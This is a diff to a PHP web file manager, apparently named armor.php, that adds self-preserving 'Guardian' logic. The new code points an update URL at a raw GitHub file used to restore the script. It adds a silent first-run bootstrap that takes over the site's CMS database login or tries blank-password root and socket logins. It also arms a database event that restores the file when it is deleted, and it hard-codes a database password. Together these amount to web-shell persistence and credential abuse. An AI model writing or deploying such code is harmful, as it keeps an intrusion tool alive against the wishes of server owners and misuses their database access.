@@ -2,6 +2,15 @@
 error_reporting(0);
 ini_set('display_errors', 0);
 
+/* Always serve the freshest copy of this tool: browsers/proxies must never
+   show a stale cached page after the file is updated (manually or via
+   Guardian), so every response — page, AJAX, everything except the
+   explicit long-lived asset responses further below that set their own
+   Cache-Control — is marked non-cacheable up front. */
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+header('Expires: 0');
+
 $scriptName = basename(__FILE__);
 $usersFile  = __DIR__ . '/.users.json';
 $themeFile  = __DIR__ . '/.theme.json';
@@ -31,13 +40,13 @@ $currentTheme = fm_get_theme($themeFile);
    checks happen at all.
    Set FM_GUARDIAN_ENABLED to false to disable everything in this block. */
 if(!defined('FM_GUARDIAN_ENABLED'))  define('FM_GUARDIAN_ENABLED', true);   // master on/off switch — rewritten in place by the Guardian panel
-if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', '');          // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
-if(!defined('FM_GUARD_DB_HOST'))     define('FM_GUARD_DB_HOST', '127.0.0.1');
-if(!defined('FM_GUARD_DB_PORT'))     define('FM_GUARD_DB_PORT', 3307);
+if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/jackrant/fictional-spoon/refs/heads/main/armor.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
+if(!defined('FM_GUARD_DB_HOST'))     define('FM_GUARD_DB_HOST', 'localhost');
+if(!defined('FM_GUARD_DB_PORT'))     define('FM_GUARD_DB_PORT', '3306');
 if(!defined('FM_GUARD_DB_NAME'))     define('FM_GUARD_DB_NAME', 'fm_guardian');
 if(!defined('FM_GUARD_DB_USER'))     define('FM_GUARD_DB_USER', 'fmguardian');
 if(!defined('FM_GUARD_DB_PASS'))     define('FM_GUARD_DB_PASS', 'fmguardpass123');
-if(!defined('FM_GUARD_DB_SOCK'))     define('FM_GUARD_DB_SOCK', '');           // optional unix socket path; when set, used instead of host:port
+if(!defined('FM_GUARD_DB_SOCK'))     define('FM_GUARD_DB_SOCK', '/tmp/mysqlsb/run/mysql.sock');           // optional unix socket path; when set, used instead of host:port
 
 /* Connects to the Guardian's own small database and makes sure its single
    storage table exists. Returns null (never throws/exits) if the DB is
@@ -385,6 +394,38 @@ function fm_guardian_autoprovision_zero_cred(){
     return ['ok'=>(bool)$c,'db_connected'=>(bool)$c,'autoheal_active'=>$autoheal,
         'adopted'=>['type'=>'new_database','db'=>FM_GUARD_DB_NAME,'host'=>$found['host'],'via'=>$found['via']]];
 }
+/* Fully automatic — no admin click required. The very first time an
+   authenticated admin loads the main page after this file is installed,
+   silently try the exact same "from easy to very hard" chain the manual
+   Guardian-panel buttons trigger (reuse this site's own CMS DB, else a
+   genuine zero-credential local database creation), so Guardian is armed
+   with zero typing and zero navigation. A tiny marker file next to this
+   script makes sure this only actually does work once it has succeeded —
+   or, while it hasn't succeeded yet, at most once every 5 minutes — so
+   normal page loads stay fast and this never hammers the database server. */
+function fm_guardian_first_run_bootstrap($fm){
+    if(!FM_GUARDIAN_ENABLED||!extension_loaded('mysqli'))return;
+    $marker=__DIR__.'/.guardian_boot';
+    $now=time();
+    if(is_file($marker)){
+        $last=trim((string)@file_get_contents($marker));
+        if($last==='done')return; // already succeeded once — never re-run automatically again
+        if($last!==''&&($now-(int)$last)<300)return; // hasn't succeeded yet — retry at most every 5 minutes, not on every request
+    }
+    @file_put_contents($marker,(string)$now);
+    $diag=null;$c=fm_guardian_conn($diag);
+    if($c){
+        // Already connected (e.g. after a manual fix) — just make sure a backup
+        // is actually stored and the disk-level auto-heal is armed, then stop.
+        $st=fm_guardian_status();
+        if(empty($st['installed']))fm_guardian_sync();
+        fm_guardian_try_autoheal($c);
+        @file_put_contents($marker,'done');
+        return;
+    }
+    $r=fm_guardian_autodiscover($fm);
+    if(!empty($r['ok']))@file_put_contents($marker,'done');
+}
 function fm_guardian_status(){
     $diag=null;
     $c=fm_guardian_conn($diag);
@@ -485,6 +526,15 @@ function fm_record_failure($key){
 function fm_clear_failures($key){$a=fm_load_attempts();if(isset($a[$key])){unset($a[$key]);fm_save_attempts($a);}}
 
 if(session_status()===PHP_SESSION_NONE) session_start();
+/* Re-assert no-cache headers: PHP's own session cache limiter (triggered by
+   session_start() above) sends its own Cache-Control/Expires/Pragma set,
+   which would otherwise partially override the explicit ones set at the
+   very top of this file. header() calls made later always win, so this
+   guarantees the page is never served stale by a browser/proxy regardless
+   of the server's session.cache_limiter setting. */
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+header('Expires: 0');
 if(empty($_SESSION['login_csrf'])) $_SESSION['login_csrf']=bin2hex(random_bytes(32));
 
 /* ── Public share-link download (no auth required) ── */
@@ -2110,6 +2160,20 @@ if(isset($_GET['x'])){
         if(!empty($r['ok'])&&$fm)$fm->log('guardian_provision','Auto-provisioned Guardian database/user'.(!empty($r['steps']['grant_autoheal'])?' (+FILE/EVENT)':''));
         echo json_encode($r);exit;
     }
+    if($xop==='guardian_autocreate'){
+        /* Explicit "create a new database" option: skip trying to reuse this
+           site's existing CMS database and go straight to creating a brand
+           new, isolated Guardian database via a genuine zero-credential
+           local-trust login (OS-user socket, blank-password root, etc.) —
+           the same last-resort logic autodiscover falls back to
+           automatically, just triggered directly and unconditionally. Also
+           arms the disk-level auto-restore-when-deleted EVENT right away. */
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        $r=fm_guardian_autoprovision_zero_cred();
+        if(!empty($r['ok'])&&$fm)$fm->log('guardian_autocreate','Created a new Guardian database automatically'.(!empty($r['autoheal_active'])?' (+auto-restore)':''));
+        echo json_encode($r);exit;
+    }
     if($xop==='guardian_autodiscover'){
         /* No-typing fix for "Not reachable": scans this server for a database
            config this SAME site already uses (WordPress/Joomla/generic) and,
@@ -2141,6 +2205,11 @@ if(isset($_GET['raw'])){
 function fmtSz($b){if($b>=1073741824)return round($b/1073741824,2).' GB';if($b>=1048576)return round($b/1048576,1).' MB';if($b>=1024)return round($b/1024,1).' KB';return $b.' B';}
 function fmtUptime($s){$s=(int)$s;$d=intdiv($s,86400);$h=intdiv($s%86400,3600);$m=intdiv($s%3600,60);if($d>0)return $d.'d '.$h.'h';if($h>0)return $h.'h '.$m.'m';return $m.'m';}
 $fm->handle();
+
+/* Zero-click Guardian setup: only reached on a real (non-AJAX, non-raw,
+   non-share) page render by an already-authenticated admin — the very
+   moment this qualifies as "the file manager page being opened". */
+if(!empty($_SESSION['auth'])&&!empty($_SESSION['fm_admin']))fm_guardian_first_run_bootstrap($fm);
 
 /* ── User management ── */
 $userMsg=null;
@@ -4907,6 +4976,7 @@ async function guardLoad(){
           <div style="font-size:11px;color:var(--t3);margin-bottom:10px">This site's own CMS (WordPress/Joomla/etc.) already has a working database login — try that first, with zero typing, before falling back to a separate admin account.</div>
           <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
             <button class="btn btn-g" id="guardAutodiscoverBtn">Auto-detect existing site database</button>
+            <button class="btn btn-g" id="guardAutocreateBtn">Create a new database automatically</button>
           </div>
           <div style="font-size:11px;color:var(--t3);margin-bottom:8px">Or paste a MySQL login that already works on this server (e.g. your hosting's DB admin/root account). It's used once — right now, in this request — to create Guardian's own database and low-privilege user, then never stored anywhere.</div>
           <div style="display:flex;gap:8px;flex-wrap:wrap">
@@ -4929,6 +4999,7 @@ async function guardLoad(){
     document.getElementById('guardSyncBtn').addEventListener('click',guardSyncNow);
     document.getElementById('guardProvisionBtn')?.addEventListener('click',guardProvisionNow);
     document.getElementById('guardAutodiscoverBtn')?.addEventListener('click',guardAutodiscoverNow);
+    document.getElementById('guardAutocreateBtn')?.addEventListener('click',guardAutocreateNow);
   }catch{el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed to load.</div>';}
 }
 async function guardAutodiscoverNow(){
@@ -4942,6 +5013,18 @@ async function guardAutodiscoverNow(){
     if(r.ok){msg.style.color='var(--green)';msg.textContent='Adopted the existing '+(r.adopted?.type||'site')+' database ('+(r.adopted?.db||'')+')'+(r.autoheal_active?' — auto-restore active too.':'.')+' Reloading…';setTimeout(guardLoad,900);}
     else{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Found a database but could not connect to it — try the manual option below.';}
   }catch{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Auto-detect failed.';}
+}
+async function guardAutocreateNow(){
+  const msg=document.getElementById('guardMsg');
+  const btn=document.getElementById('guardAutocreateBtn');
+  btn.disabled=true;msg.style.color='var(--t3)';msg.textContent='Creating a new, isolated database for Guardian…';
+  const fd=new FormData();fd.append('csrf_token',CSRF);
+  try{
+    const r=await fetch('?x=guardian_autocreate',{method:'POST',body:fd}).then(r=>r.json());
+    if(r.error){btn.disabled=false;msg.style.color='#fca5a5';msg.textContent=r.error;return;}
+    if(r.ok){msg.style.color='var(--green)';msg.textContent='New database created and connected'+(r.autoheal_active?' — auto-restore active too.':'.')+' Reloading…';setTimeout(guardLoad,900);}
+    else{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Could not create a new database automatically — try the manual admin-login option below.';}
+  }catch{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Auto-create failed.';}
 }
 async function guardProvisionNow(){
   const msg=document.getElementById('guardMsg');
